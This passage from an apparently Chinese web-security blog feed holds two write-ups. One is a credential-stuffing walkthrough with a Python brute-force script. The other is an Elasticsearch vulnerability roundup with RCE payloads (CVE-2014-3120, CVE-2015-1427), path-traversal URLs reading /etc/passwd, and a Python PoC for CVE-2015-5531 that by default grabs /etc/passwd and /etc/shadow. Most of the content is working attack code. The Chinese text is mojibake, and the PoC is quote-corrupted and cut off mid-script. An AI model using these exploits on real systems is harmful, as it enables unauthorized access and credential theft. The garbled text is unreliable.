ï¼Œå¯å¤šæ¬¡æäº¤ç™»å½•æ•°æ®ï¼Œä½†æ˜¯å…¶ç”¨æˆ·åå¯†ç åœ¨æœ¬åœ°è¿›è¡Œäº†md5åŠ å¯†å¤„ç†ã€‚å› æ­¤ï¼Œæ’åº“ä¹‹å‰éœ€è¦æœ¬åœ°å®ç°å°†å­—å…¸è¿›è¡ŒåŠ å¯†æ“ä½œåå†æäº¤ã€‚<br>å¯¹ç™»å½•åŠŸèƒ½æŠ“åŒ…åˆ†æåï¼Œå¯ä»¥çœ‹åˆ°åœ¨å¡«å†™ç”¨æˆ·åå¯†ç åï¼Œå‰ç«¯å‘é€å¦‚ä¸‹æ•°æ®åŒ…è·å–cdã€saltæ•°æ®åŒ…ï¼š</p></blockquote><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/21-8.png" alt="21-8"></p><p>æ­¤å¤„å­˜åœ¨saltæ³„æ¼é£é™©ï¼Œå¯éå†æ‰‹æœºå·ï¼Œå¯¹äºæœªæ³¨å†Œâ½¤ç”¨æˆ·ï¼Œè¿”å›å€¼â½†saltï¼Œå¯¹äºå·²æ³¨å†Œâ½¤æˆ·saltå€¼æ’å®šã€‚<br>è€Œå®æ–½æ’åº“ï¼Œéœ€è¦å…ˆè¯·æ±‚å¾—åˆ°saltä¸cdå€¼ã€‚</p><p>ç„¶åå¯ä»å‰ç«¯ä»£ç ä¸­å¾—åˆ°åŠ å¯†ç”¨æˆ·åå¯†ç è¿‡ç¨‹ï¼š</p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/21-9.png" alt="21-9"></p><p>passç»è¿‡æœ¬åœ°md5åŠ å¯†åï¼Œ å‘é€è‡³æœåŠ¡ç«¯è¿›è¡Œç™»å½•æ ¡éªŒã€‚</p><h3 id="2-2-2-æ¼”ä¹ ï¼š"><a href="#2-2-2-æ¼”ä¹ ï¼š" class="headerlink" title="2.2.2 æ¼”ä¹ ï¼š"></a>2.2.2 æ¼”ä¹ ï¼š</h3><p>å› æ­¤ï¼Œæˆ‘ä»¬åªéœ€è¦ç”¨è„šæœ¬ï¼Œå…ˆè¾“å…¥ç”¨æˆ·åå³æ‰‹æœºå·ï¼Œè¯·æ±‚å¾—åˆ°cdã€saltå€¼ï¼Œç„¶åå†ä»å¯†ç å­—å…¸ä¸­ï¼Œå–å‡ºå¯†ç è¿›è¡Œmd5åŠ å¯†ï¼Œæœ€åå‘åŒ…è¯·æ±‚å³å¯ã€‚ç¼–å†™pythonè„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line">#-*- coding=utf-8 -*-</div><div class="line"></div><div class="line">import requests</div><div class="line">import hashlib</div><div class="line">import json</div><div class="line"></div><div class="line"></div><div class="line">def GetPass():</div><div class="line">fp = open(&quot;./pass.txt&quot;,&quot;r&quot;)</div><div class="line">if fp == 0:</div><div class="line">print (&quot;open file error!&quot;)</div><div class="line">return;</div><div class="line">while 1:</div><div class="line">line = fp.readline()</div><div class="line">if not line:</div><div class="line">break</div><div class="line">passwd = line.strip(&apos;\n&apos;)</div><div class="line">Brute_Force_Dididai(&quot;150****1403&quot;,passwd);</div><div class="line"></div><div class="line">def Brute_Force_Dididai(username,password):</div><div class="line"></div><div class="line"># url = &quot;&quot;</div><div class="line">    s = requests.Session()</div><div class="line">s.headers = &#123;</div><div class="line">            &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko)Chrome/51.0.2704.103 Safari/537.36&apos;,</div><div class="line">            &apos;X-Requested-With&apos;: &apos;XMLHttpRequest&apos;,</div><div class="line">    &#125;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">url = &quot;http://www.foo.com/?m=&amp;s=getcd&quot;</div><div class="line">data = &#123;&quot;username&quot;:username&#125;</div><div class="line"></div><div class="line">html = s.post(url,data = data)</div><div class="line"></div><div class="line">print html.content</div><div class="line">salt_cd = json.loads(html.content)</div><div class="line">print salt_cd[&apos;salt&apos;]</div><div class="line">print salt_cd[&apos;cd&apos;]</div><div class="line">md5_pass = hashlib.md5(password.encode(&apos;utf-8&apos;)).hexdigest()+salt_cd[&apos;salt&apos;]</div><div class="line">md5_salt = hashlib.md5(md5_pass.encode(&apos;utf-8&apos;)).hexdigest()+str(salt_cd[&apos;cd&apos;])</div><div class="line">md5_cd = hashlib.md5(md5_salt.encode(&apos;utf-8&apos;)).hexdigest()</div><div class="line">print md5_cd</div><div class="line"></div><div class="line">url1 = &quot;http://www.foo.com/?m=&amp;s=login_wd&amp;ismd5=1&quot;</div><div class="line">data1 = &#123;&quot;username&quot;:&quot;username&quot;,&quot;password&quot;:md5_cd&#125;</div><div class="line">html1 = s.post(url1,data = data1)</div><div class="line">print html1.content</div><div class="line">print len(html1.content);</div><div class="line"></div><div class="line">GetPass()</div></pre></td></tr></table></figure><p>ç„¶åå‡†å¤‡æµ‹è¯•pass.txt:</p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/21-10.png" alt="21-10"></p><h3 id="2-2-3-æ”»å‡»ï¼š"><a href="#2-2-3-æ”»å‡»ï¼š" class="headerlink" title="2.2.3 æ”»å‡»ï¼š"></a>2.2.3 æ”»å‡»ï¼š</h3><p>æœ€ååªéœ€è¦æ‰§è¡Œè„šæœ¬å³å¯ï¼š</p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/21-11.png" alt="21-11"></p><p>æœ€åæ˜¯çˆ†ç ´æˆåŠŸè¿”å›åˆ°æ•°æ®åŒ…ï¼Œç”±æ­¤å¯å¾—åˆ°æ­£ç¡®ç”¨æˆ·åå¯†ç ã€‚<br>freebufåœ°å€<a href="http://www.freebuf.com/articles/web/184455.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/184455.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;1-1-ç®€è¿°ï¼š&quot;&gt;&lt;a href=&quot;#1-1-ç®€è¿°ï¼š&quot; class=&quot;headerlink&quot; title=&quot;1.1 ç®€è¿°ï¼š&quot;&gt;&lt;/a&gt;1.1 ç®€è¿°ï¼š&lt;/h2&gt;&lt;p&gt;æœ€è¿‘é‡åˆ°ä¸¤ä¸ªä¸ªæ¡ˆä¾‹ï¼Œç»è¿‡ä¸€ç•ªå€’è…¾ï¼Œå‘ç°å…¶ç™»å½•åŠŸèƒ½å‡å¯æ’åº“ã€‚ä½†æ˜¯éƒ½å­˜åœ¨ç™»å½•æ•°æ®æœ¬åœ°åŠ å¯†ï¼Œæœ‰ç©ºäº†æ”¾ä¸€èµ·æ€»ç»“è®°å½•ä¸€ä¸‹ã€‚
    
    </summary>
    
      <category term="WEBå®‰å…¨" scheme="http://sunu11.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="çˆ†ç ´" scheme="http://sunu11.com/tags/%E7%88%86%E7%A0%B4/"/>
    
      <category term="jsåŠ å¯†" scheme="http://sunu11.com/tags/js%E5%8A%A0%E5%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>Elsaticsearch æ¼æ´å°ç»“</title>
    <link href="http://sunu11.com/2018/07/14/20/"/>
    <id>http://sunu11.com/2018/07/14/20/</id>
    <published>2018-07-13T16:06:05.000Z</published>
    <updated>2018-11-03T11:59:40.047Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0-å› "><a href="#0-å› " class="headerlink" title="0.å› "></a>0.å› </h3><p>ä¼—æµ‹è¿‡ç¨‹ä¸­é‡åˆ°äº†Elsaticsearchæœªæˆæƒè®¿é—®çš„æƒ…å†µï¼Œæå®Œå‘ç°åˆæŠŠæ—¶é—´æµªè´¹åœ¨äº†æŸ¥å„ç§èµ„æ–™ä¸Šï¼Œ<a id="more"></a>æ•…å°è®°ä¸€ç•ªã€‚</p><h3 id="1-æœ"><a href="#1-æœ" class="headerlink" title="1.æœ"></a>1.æœ</h3><h4 id="1-1-CVE-2014-3120-elasticsearch-v1-1-1-â€“-å‘½ä»¤æ‰§è¡Œæ¼æ´"><a href="#1-1-CVE-2014-3120-elasticsearch-v1-1-1-â€“-å‘½ä»¤æ‰§è¡Œæ¼æ´" class="headerlink" title="1.1 (CVE-2014-3120)elasticsearch v1.1.1 â€“ å‘½ä»¤æ‰§è¡Œæ¼æ´"></a>1.1 (CVE-2014-3120)elasticsearch v1.1.1 â€“ å‘½ä»¤æ‰§è¡Œæ¼æ´</h4><h5 id="åˆ©ç”¨ï¼š"><a href="#åˆ©ç”¨ï¼š" class="headerlink" title="åˆ©ç”¨ï¼š"></a>åˆ©ç”¨ï¼š</h5><p>1ã€åˆ›å»ºæ•°æ®ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">posturl: http://ip:9200/foo/foo2</div><div class="line"></div><div class="line">postdataï¼š</div><div class="line"></div><div class="line">&#123;</div><div class="line">  &quot;name&quot;: &quot;data&quot;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>2ã€æ‰§è¡Œå‘½ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">posturl: http://ip:9200/_search?pretty </div><div class="line"></div><div class="line">postdata:</div><div class="line">&#123;</div><div class="line">    &quot;size&quot;: 1,</div><div class="line">    &quot;query&quot;: &#123;</div><div class="line">      &quot;filtered&quot;: &#123;</div><div class="line">        &quot;query&quot;: &#123;</div><div class="line">          &quot;match_all&quot;: &#123;</div><div class="line">          &#125;</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">    &#125;,</div><div class="line">    &quot;script_fields&quot;: &#123;</div><div class="line">        &quot;command&quot;: &#123;</div><div class="line">            &quot;script&quot;: &quot;import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\&quot;id\&quot;).getInputStream()).useDelimiter(\&quot;\\\\A\&quot;).next();&quot;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h5 id="å…¶ä»–èµ„æ–™ï¼š"><a href="#å…¶ä»–èµ„æ–™ï¼š" class="headerlink" title="å…¶ä»–èµ„æ–™ï¼š"></a>å…¶ä»–èµ„æ–™ï¼š</h5><p>ï¼ˆ1ï¼‰dockerfileåœ°å€<br><a href="https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2014-3120" target="_blank" rel="external">https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2014-3120</a><br><br>ï¼ˆ2ï¼‰<a href="https://www.t00ls.net/viewthread.php?tid=29408" target="_blank" rel="external">https://www.t00ls.net/viewthread.php?tid=29408</a><br><br>ï¼ˆ3ï¼‰<a href="http://bouk.co/blog/elasticsearch-rce" target="_blank" rel="external">http://bouk.co/blog/elasticsearch-rce</a><br></p><h4 id="1-2-ï¼ˆCVE-2015-1427ï¼‰ElasticSearch-Groovy-v1-4-2ä»¥ä¸‹-â€“-æ²™ç›’ç»•è¿‡-amp-amp-ä»£ç æ‰§è¡Œæ¼æ´"><a href="#1-2-ï¼ˆCVE-2015-1427ï¼‰ElasticSearch-Groovy-v1-4-2ä»¥ä¸‹-â€“-æ²™ç›’ç»•è¿‡-amp-amp-ä»£ç æ‰§è¡Œæ¼æ´" class="headerlink" title="1.2 ï¼ˆCVE-2015-1427ï¼‰ElasticSearch Groovy v1.4.2ä»¥ä¸‹ â€“ æ²™ç›’ç»•è¿‡ &amp;&amp; ä»£ç æ‰§è¡Œæ¼æ´"></a>1.2 ï¼ˆCVE-2015-1427ï¼‰ElasticSearch Groovy v1.4.2ä»¥ä¸‹ â€“ æ²™ç›’ç»•è¿‡ &amp;&amp; ä»£ç æ‰§è¡Œæ¼æ´</h4><h5 id="åˆ©ç”¨ï¼š-1"><a href="#åˆ©ç”¨ï¼š-1" class="headerlink" title="åˆ©ç”¨ï¼š"></a>åˆ©ç”¨ï¼š</h5><p>Javaæ²™ç›’ç»•è¿‡æ³•ï¼š</p><blockquote><p>java.lang.Math.class.forName(â€œjava.lang.Runtimeâ€).getRuntime().exec(â€œidâ€).getText()</p></blockquote><p>Goovyç›´æ¥æ‰§è¡Œå‘½ä»¤æ³•ï¼š</p><blockquote><p>def command=â€™idâ€™;def res=command.execute().text;res</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">posturl: http://ip:9200/_search?pretty </div><div class="line">postdata:</div><div class="line">&#123;&quot;size&quot;:1, &quot;script_fields&quot;: &#123;&quot;lupin&quot;:&#123;&quot;lang&quot;:&quot;groovy&quot;,&quot;script&quot;: &quot;java.lang.Math.class.forName(\&quot;java.lang.Runtime\&quot;).getRuntime().exec(\&quot;id\&quot;).getText()&quot;&#125;&#125;&#125;</div></pre></td></tr></table></figure><h5 id="å…¶ä»–èµ„æ–™ï¼š-1"><a href="#å…¶ä»–èµ„æ–™ï¼š-1" class="headerlink" title="å…¶ä»–èµ„æ–™ï¼š"></a>å…¶ä»–èµ„æ–™ï¼š</h5><p>(1ï¼‰dockerfileåœ°å€:<a href="https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2015-1427" target="_blank" rel="external">https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2015-1427</a><br><br>(2ï¼‰<a href="http://cb.drops.wiki/drops/papers-5107.html" target="_blank" rel="external">http://cb.drops.wiki/drops/papers-5107.html</a><br><br>(3ï¼‰<a href="http://jordan-wright.com/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427" target="_blank" rel="external">http://jordan-wright.com/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427</a><br><br>(4ï¼‰<a href="https://github.com/XiphosResearch/exploits" target="_blank" rel="external">https://github.com/XiphosResearch/exploits</a><br><br>(5ï¼‰<a href="http://cb.drops.wiki/drops/papers-5142.html" target="_blank" rel="external">http://cb.drops.wiki/drops/papers-5142.html</a><br></p><h4 id="1-3ï¼ˆCVE-2015-3337ï¼‰ElasticSearch-1-4-5ä»¥ä¸‹-1-5-2ä»¥ä¸‹-â€“-ç›®å½•ç©¿è¶Šæ¼æ´"><a href="#1-3ï¼ˆCVE-2015-3337ï¼‰ElasticSearch-1-4-5ä»¥ä¸‹-1-5-2ä»¥ä¸‹-â€“-ç›®å½•ç©¿è¶Šæ¼æ´" class="headerlink" title="1.3ï¼ˆCVE-2015-3337ï¼‰ElasticSearch 1.4.5ä»¥ä¸‹/1.5.2ä»¥ä¸‹ â€“ ç›®å½•ç©¿è¶Šæ¼æ´"></a>1.3ï¼ˆCVE-2015-3337ï¼‰ElasticSearch 1.4.5ä»¥ä¸‹/1.5.2ä»¥ä¸‹ â€“ ç›®å½•ç©¿è¶Šæ¼æ´</h4><h5 id="åˆ©ç”¨ï¼š-2"><a href="#åˆ©ç”¨ï¼š-2" class="headerlink" title="åˆ©ç”¨ï¼š"></a>åˆ©ç”¨ï¼š</h5><p>è¯»æœåŠ¡å™¨ä¸Šæ–‡ä»¶ï¼šburpsuiteçš„repeaterä¸­è®¿é—®urlï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ip:9200/_plugin/head/../../../../../../../../../etc/passwd</div></pre></td></tr></table></figure><h5 id="å…¶ä»–ï¼š"><a href="#å…¶ä»–ï¼š" class="headerlink" title="å…¶ä»–ï¼š"></a>å…¶ä»–ï¼š</h5><p>ï¼ˆ1ï¼‰åŸç†ï¼šåœ¨å®‰è£…äº†å…·æœ‰â€œsiteâ€åŠŸèƒ½çš„æ’ä»¶ä»¥åï¼Œæ’ä»¶ç›®å½•ä½¿ç”¨../å³å¯å‘ä¸Šè·³è½¬ï¼Œå¯¼è‡´ç›®å½•ç©¿è¶Šæ¼æ´ï¼Œå¯è¯»å–ä»»æ„æ–‡ä»¶ã€‚æ²¡æœ‰å®‰è£…ä»»æ„æ’ä»¶çš„elasticsearchä¸å—å½±å“ã€‚<br><br>ï¼ˆ2ï¼‰dockerfileåœ°å€ï¼š<a href="https://github.com/vulhub/vulhub/pulse" target="_blank" rel="external">https://github.com/vulhub/vulhub/pulse</a><br></p><h4 id="1-4-ï¼ˆCVE-2015-5531ï¼‰ElasticSearch-1-6-1ä»¥ä¸‹-â€“-ç›®å½•ç©¿è¶Šæ¼æ´"><a href="#1-4-ï¼ˆCVE-2015-5531ï¼‰ElasticSearch-1-6-1ä»¥ä¸‹-â€“-ç›®å½•ç©¿è¶Šæ¼æ´" class="headerlink" title="1.4 ï¼ˆCVE-2015-5531ï¼‰ElasticSearch 1.6.1ä»¥ä¸‹ â€“ ç›®å½•ç©¿è¶Šæ¼æ´"></a>1.4 ï¼ˆCVE-2015-5531ï¼‰ElasticSearch 1.6.1ä»¥ä¸‹ â€“ ç›®å½•ç©¿è¶Šæ¼æ´</h4><h5 id="è¯´æ˜ï¼š"><a href="#è¯´æ˜ï¼š" class="headerlink" title="è¯´æ˜ï¼š"></a>è¯´æ˜ï¼š</h5><p>è¯¥æ¼æ´åœ¨elasticsearch 1.5.1åŠä»¥å‰ï¼Œæ— éœ€ä»»ä½•é…ç½®å³å¯è§¦å‘ã€‚ä¹‹åçš„æ–°ç‰ˆï¼Œ<em>é…ç½®æ–‡ä»¶elasticsearch.ymlä¸­å¿…é¡»å­˜åœ¨path.repoï¼Œè¯¥é…ç½®å€¼ä¸ºä¸€ä¸ªç›®å½•ï¼Œä¸”è¯¥ç›®å½•å¿…é¡»å¯å†™ï¼Œç­‰äºé™åˆ¶äº†å¤‡ä»½ä»“åº“çš„æ ¹ä½ç½®ã€‚ä¸é…ç½®è¯¥å€¼ï¼Œé»˜è®¤ä¸å¯åŠ¨è¿™ä¸ªåŠŸèƒ½</em>ã€‚</p><h5 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h5><p>1ã€åˆ›å»ºä¸€ä¸ªä»“åº“ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">puturl: /_snapshot/test</div><div class="line"></div><div class="line">putdata:</div><div class="line">&#123;</div><div class="line">    &quot;type&quot;: &quot;fs&quot;,</div><div class="line">    &quot;settings&quot;: &#123;</div><div class="line">        &quot;location&quot;: &quot;/usr/share/elasticsearch/repo/test&quot; </div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>2ã€åˆ›å»ºä¸€ä¸ªå¿«ç…§ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">puturl: /_snapshot/test2</div><div class="line"></div><div class="line">putdata:</div><div class="line">&#123;</div><div class="line">    &quot;type&quot;: &quot;fs&quot;,</div><div class="line">    &quot;settings&quot;: &#123;</div><div class="line">        &quot;location&quot;: &quot;/usr/share/elasticsearch/repo/test/snapshot-backdata&quot; </div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>3ã€ç›®å½•ç©¿è¶Šè®¿é—®æœåŠ¡å™¨æ–‡ä»¶ï¼Œåœ¨burpsuite ä¸­repeaterè®¿é—®ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ip:9200/_snapshot/test/backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd</div></pre></td></tr></table></figure></p><p>4ã€ä»repeaterä¸­å°†é”™è¯¯ä¿¡æ¯è§£ç ï¼Œå³å¯å¾—åˆ°å¯¹åº”æœåŠ¡å™¨æ–‡ä»¶ï¼ˆpasswdï¼‰ä¿¡æ¯ã€‚</p><h5 id="å…¶ä»–èµ„æ–™ï¼š-2"><a href="#å…¶ä»–èµ„æ–™ï¼š-2" class="headerlink" title="å…¶ä»–èµ„æ–™ï¼š"></a>å…¶ä»–èµ„æ–™ï¼š</h5><p>ï¼ˆ1ï¼‰åŸç†ï¼šelasticsearchä¸­å¤‡ä»½çš„å¿«ç…§ä¿å­˜åœ¨å¤‡ä»½ä»“åº“ä¸­çš„å‘½åæ ¼å¼æ˜¯ä»¥snapshot-xxxçš„æ ¼å¼,æ‰€ä»¥snapshot-backdata ä¼šè¢«è¯¯ä»¥ä¸ºæ˜¯testä»“åº“çš„backdataå¿«ç…§ï¼Œå¿«ç…§éƒ½æ˜¯æ–‡ä»¶å½¢å¼ä¿å­˜çš„ï¼Œè€Œsnapshot-backdataæ˜¯ç›®å½•ï¼Œelasticsearch æ²¡æœ‰åŒºåˆ†ï¼Œå¦‚æœelasticsearchå‘ç°å…¶æ˜¯ç›®å½•ä¹‹åï¼Œå°±ç»§ç»­è¯»å–ç›®å½•ä¸‹çš„å†…å®¹ï¼Œå¦‚æœç›®å½•ä¸‹çš„æ–‡ä»¶æ˜ç§°æ˜¯æ¶æ„æ„é€ çš„(ç±»ä¼¼../../../) elasticsearchå°±ä¼šå»è¯»å–è¿™ä¸ªé€’å½’è¯»å–æ–‡ä»¶çš„å†…å®¹ï¼ˆè¿™é‡Œelasticsearchæ²¡æœ‰è¿‡æ»¤..ï¼‰ï¼Œä»è€Œå¯¼è‡´ç›®å½•éå†ï¼ˆä»»æ„æ–‡ä»¶å†…å®¹è¯»å–ï¼‰<br><br>ï¼ˆ2ï¼‰dockerfileåœ°å€ï¼š<a href="https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2015-5531" target="_blank" rel="external">https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2015-5531</a><br><br>ï¼ˆ3ï¼‰python pocï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line"># -*- coding:utf8 -*-</div><div class="line">&quot;&quot;&quot;</div><div class="line">PoC for CVE-2015-5531</div><div class="line">Affects ElasticSearch 1.6.0 and prior</div><div class="line">&quot;&quot;&quot;</div><div class="line">import re</div><div class="line">import sys</div><div class="line">import json</div><div class="line">import requests</div><div class="line">import urllib</div><div class="line">import argparse</div><div class="line">import traceback</div><div class="line">import termcolor</div><div class="line">def colorize_red(string):</div><div class="line">    &quot;&quot;&quot;</div><div class="line">    :param string:</div><div class="line">    :return</div><div class="line">    &quot;&quot;&quot;</div><div class="line">    return termcolor.colored(string, &apos;red&apos;)</div><div class="line">def colorize_green(string):</div><div class="line">    &quot;&quot;&quot;</div><div class="line">    :param string:</div><div class="line">    :return:</div><div class="line">    &quot;&quot;&quot;</div><div class="line">    return termcolor.colored(string, &apos;green&apos;)</div><div class="line">def create_repos(base_url):</div><div class="line">    &quot;&quot;&quot;</div><div class="line">    :param base_url:</div><div class="line">    :return: None</div><div class="line">    &quot;&quot;&quot;</div><div class="line">    for index, repo_name in enumerate(REPO_NAME_LST):</div><div class="line">        </div><div class="line">        url = &quot;&#123;0&#125;&#123;1&#125;&quot;.format(base_url, repo_name)</div><div class="line">        req = requests.post(url, json=DATA_REPO_LST[index])</div><div class="line">         </div><div class="line">        if â€œacknowledgedâ€ in req.json():</div><div class="line">            print colorize_green(â€œrepository &#123;0&#125;: create successâ€.format(repo_name))</div><div class="line">def grab_file(vuln_url):</div><div class="line">    â€œâ€&quot;</div><div class="line">    :param xplurl:</div><div class="line">    :return:</div><div class="line">    â€œâ€&quot;</div><div class="line">    </div><div class="line">    req = requests.get(vuln_url)</div><div class="line">    if req.status_code == 400:</div><div class="line">        data = req.json()</div><div class="line">        extrdata = re.findall(râ€™\d+â€™, str(data[&apos;error&apos;]))</div><div class="line">        decoder = bytearray()</div><div class="line">        for i in extrdata[2:]:</div><div class="line">            decoder.append(int(i))</div><div class="line">        print colorize_green(decoder)</div><div class="line">def exploit(**args):</div><div class="line">    â€œâ€&quot;</div><div class="line">    :param args:</div><div class="line">    :return:</div><div class="line">    â€œâ€&quot;</div><div class="line">    target = args[&apos;target&apos;]</div><div class="line">    port = args[&apos;port&apos;]</div><div class="line">    fpath = args[&apos;fpath&apos;].split(â€˜,â€™)</div><div class="line">    fpath = [urllib.quote(fp, safe=&apos;&apos;) for fp in fpath]</div><div class="line">    base_url = â€œhttp://&#123;0&#125;:&#123;1&#125;/_snapshot/â€.format(target, port)</div><div class="line">    #create elasticsearch repository for snapshot</div><div class="line">    create_repos(base_url)</div><div class="line">    #grab files</div><div class="line">    for fp in fpath:</div><div class="line">        vuln_url = â€˜&#123;0&#125;&#123;1&#125;/&#123;2&#125;&#123;3&#125;â€™.format(base_url, REPO_NAME_LST[0], FCK, fp)</div><div class="line">        print colorize_red(urllib.unquote(fp)) + â€œ:\nâ€</div><div class="line">        grab_file(vuln_url)</div><div class="line">if __name__ == â€œ__main__â€:</div><div class="line">    # for global</div><div class="line">    FCK = â€˜backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..â€™</div><div class="line">    REPO_NAME_LST = [&apos;test11&apos;, &apos;test12&apos;]</div><div class="line"> </div><div class="line">   DATA_REPO_LST = [&#123;&quot;type&quot;: &quot;fs&quot;, &quot;settings&quot;: &#123;&quot;location&quot;: </div><div class="line">&quot;/tmp/test30&quot;&#125;&#125;, &#123;&quot;type&quot;: &quot;fs&quot;, &quot;settings&quot;: &#123;&quot;location&quot;: </div><div class="line">&quot;/tmp/test30/snapshot-backdata&quot;&#125;&#125;]</div><div class="line">    parser = argparse.ArgumentParser(usage=â€python cve-2015-5531.py optionsâ€,</div><div class="line">                                     description=â€cve-2015-5531 Vuln PoCâ€, add_help=True)</div><div class="line">    parser.add_argument(â€˜-tâ€™, â€˜â€“targetâ€™, metavar=â€™TARGETâ€™, type=str, dest=â€targetâ€, required=True, help=â€™eg: 127.0.0.1 or www.baidu.comâ€™)</div><div class="line"> </div><div class="line">   parser.add_argument(â€˜-pâ€™, â€˜â€“portâ€™, metavar=â€™PORTâ€™, dest=â€™portâ€™, </div><div class="line">type=int, default=9200, help=â€™elasticsearch port default 9200â€²)</div><div class="line">   </div><div class="line"> parser.add_argument(â€˜â€“fpathâ€™, metavar=â€™FPATHâ€™, dest=â€™fpathâ€™, type=str,</div><div class="line"> default=â€™/etc/passwd,/etc/shadowâ€™, help=â€™file to grab multi files </div><div class="line">separated by comma â€˜)</div><div class="line">    args = parser.parse_args()</div><div class="line">    try:</div><div class="line">        exploit(**args.__dict__)</div><div class="line">    except:</div><div class="line">        